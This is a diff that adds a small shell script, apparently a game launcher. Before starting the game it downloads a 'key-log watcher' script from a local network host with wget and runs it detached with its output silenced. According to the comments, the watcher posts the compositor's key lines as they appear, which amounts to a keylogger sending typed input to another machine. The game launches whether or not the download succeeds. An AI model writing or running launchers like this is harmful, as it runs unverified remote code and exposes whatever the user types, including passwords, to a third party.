@@ -1,0 +1,12 @@
+#!/bin/sh
+# Round 2: start the key-log watcher detached, then the game. Play afterwards; the watcher
+# posts the compositor's key lines as they appear, so no second command is needed.
+set -u
+if ! wget -T 20 -qO /tmp/kb4453-watch http://192.168.0.104:8766/kb4453-watch; then
+    echo "watcher download failed -- continuing without it"
+else
+    setsid sh /tmp/kb4453-watch >/dev/null 2>&1 &
+    echo "key watcher started (25 minutes)"
+fi
+echo "starting the game; keep this terminal open while playing"
+sh /tmp/hollow4452-egl
